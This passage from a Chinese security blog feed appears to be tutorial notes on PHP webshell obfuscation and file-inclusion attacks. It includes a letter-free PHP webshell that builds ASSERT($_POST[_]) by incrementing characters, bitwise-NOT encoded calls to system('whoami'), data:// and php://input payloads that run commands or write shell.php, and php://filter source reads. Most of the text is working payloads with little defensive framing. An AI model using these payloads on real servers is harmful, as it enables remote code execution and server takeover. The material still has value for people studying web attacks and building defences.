class=&#34;variable&#34;&gt;$_&lt;/span&gt;[_]);   &lt;span class=&#34;comment&#34;&gt;//ASSERT($POST[_])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2&#34;&gt;#&lt;/a&gt; 2.&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;=[];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;=@&lt;span class=&#34;string&#34;&gt;&amp;quot;&lt;span class=&#34;subst&#34;&gt;$_&lt;/span&gt;&amp;quot;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// $_=&amp;#x27;Array&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;!&amp;#x27;&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;#x27;@&amp;#x27;&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// $_=$_[0];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// A&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// S&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// S&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++; &lt;span class=&#34;comment&#34;&gt;// E &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++; &lt;span class=&#34;comment&#34;&gt;// R&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++; &lt;span class=&#34;comment&#34;&gt;// T&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;_&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++; &lt;span class=&#34;comment&#34;&gt;// P&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++; &lt;span class=&#34;comment&#34;&gt;// O&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++; &lt;span class=&#34;comment&#34;&gt;// S&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++; &lt;span class=&#34;comment&#34;&gt;// T&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt;.=&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$$____&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;[_]); &lt;span class=&#34;comment&#34;&gt;// ASSERT($_POST[_]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;mark&gt;注意&lt;/mark&gt;&lt;br&gt;
由于有很多不可见字符，我们要把它们放到一排后 url 编码才能用&lt;/p&gt;
&lt;h1 id=&#34;php5与php7的区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php5与php7的区别&#34;&gt;#&lt;/a&gt; php5 与 php7 的区别&lt;/h1&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php5:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$f=&amp;#x27;assert&amp;#x27;;$f($_POST[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post: 1=phpinfo();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php7:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;($f)()方法调用函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eg.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(call_user_func)(system,whoami,&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此 php7 可以取反直接用，就像上面第一个方法一样&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(call_user_func)(system,whoami,&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&amp;#x27;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <updated>2023-04-26T15:44:49.152Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
        <title>文件包含及伪协议的使用</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
        <content type="html">&lt;h1 id=&#34;原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原因&#34;&gt;#&lt;/a&gt; 原因&lt;/h1&gt;
&lt;p&gt;四个函数:include (),include_once (),require (),require_once ()&lt;br&gt;
 只要文件内容符合 PHP 语法规范，那么任何扩展名都可以被 PHP 解析。比如把 &lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;  文件名改为 phpinfo.txt 还是可以看到信息&lt;br&gt;
包含非 PHP 语法规范源文件时，将会暴露其源代码&lt;/p&gt;
&lt;h1 id=&#34;伪协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#伪协议&#34;&gt;#&lt;/a&gt; 伪协议&lt;/h1&gt;
&lt;h2 id=&#34;1data协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1data协议&#34;&gt;#&lt;/a&gt; 1.data 协议&lt;/h2&gt;
&lt;p&gt;这是一种数据流封装器，用法: &lt;code&gt;data://text/plain,&amp;lt;?php system(&#39;whoami&#39;)?&amp;gt;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;2php协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2php协议&#34;&gt;#&lt;/a&gt; 2.php:// 协议&lt;/h2&gt;
&lt;p&gt;访问各个输入输出流&lt;/p&gt;
&lt;h3 id=&#34;1phpinput&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1phpinput&#34;&gt;#&lt;/a&gt; (1)php://input&lt;/h3&gt;
&lt;p&gt;用来接收 POST 数据&lt;br&gt;
 eg1. 增加一句话&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?file=php:input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post传参:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php fputs(fopen(&amp;quot;shell.php&amp;quot;,&amp;quot;a&amp;quot;),&amp;quot;&amp;lt;?php phpinfo.php();?&amp;gt;&amp;quot;)?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;eg2. 增加文件&lt;br&gt;
 post 部分改为:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php fputs(fopen(&amp;quot;shell.php&amp;quot;,&amp;quot;w&amp;quot;),&amp;quot;&amp;lt;?php phpinfo.php();?&amp;gt;&amp;quot;)?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;eg3. 执行系统命令&lt;br&gt;
 post 为:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php system(&amp;#x27;whoami&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;2phpfilter&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2phpfilter&#34;&gt;#&lt;/a&gt; (2)php://filter&lt;/h2&gt;
&lt;p&gt;这个语句用来查看源码。直接包含 php 文件时会被解析，不能看到源码，所以用 filter 来读取，不过要先 base64 加密传输过来&lt;br&gt;
 eg.&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php://filter/read=convert.base64-encode/resource=C:\oneword&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;还有一些可参考 php 手册&lt;/p&gt;
&lt;h2 id=&#34;3file协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3file协议&#34;&gt;#&lt;/a&gt; 3.file:// 协议&lt;/h2&gt;
&lt;p&gt;访问本地文件系统&lt;br&gt;
 eg&lt;/p&gt;
